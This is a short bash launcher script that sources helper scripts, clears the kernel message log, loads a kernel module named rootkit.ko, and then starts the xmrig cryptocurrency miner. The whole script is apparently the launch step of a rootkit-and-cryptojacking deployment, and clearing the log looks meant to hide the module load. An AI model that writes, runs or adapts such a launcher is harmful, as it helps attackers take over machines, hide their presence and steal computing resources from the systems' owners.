#!/bin/bash

echo "launcher started "

. "./rootin.sh"

echo "loading module"
dmesg -C 
insmod rootkit.ko
dmesg 
echo "done loading module"

. "./xmin.sh"

xmrig 


